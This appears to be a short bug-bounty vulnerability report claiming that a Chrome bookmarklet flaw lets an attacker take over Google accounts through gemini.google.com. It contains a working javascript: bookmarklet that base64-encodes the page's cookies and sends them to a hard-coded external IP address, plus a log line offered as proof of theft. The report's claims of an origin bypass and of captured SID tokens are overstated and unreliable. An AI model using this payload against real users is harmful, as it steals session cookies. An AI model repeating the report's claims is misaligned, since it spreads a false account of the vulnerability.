### The problem


#### Please describe the technical details of the vulnerability

**Vulnerability Summary:**

A logic flaw in Chrome's bookmarklet execution policy allows a javascript: URI to bypass origin restrictions and exfiltrate sensitive data. I have successfully demonstrated that an attacker can steal a user's full session cookies from gemini.google.com and send them to an external server without any security warnings.

**Verified Proof of Concept (PoC):**

I hosted a listener at http://3.80.77.106 and executed the following bookmarklet while on gemini.google.com:

`javascript:(function(){    var data = btoa(document.cookie);    window.location.href = "http://3.80.77.106/?data=" + data;})();`

**Server Logs (Exfiltration Proof):**

`GET /?data=X2djbF9hdT0xLjEuMj...[TRUNCATED]... HTTP/1.1" 200 396 "https://gemini.google.com/"`

Note: The truncated data above contains Base64 encoded SAPISID and SID tokens from the Google domain.


#### Impact analysis

This allows for Full Account Takeover. An attacker only needs to trick a user into clicking a bookmark once. The attack is highly effective and silent.
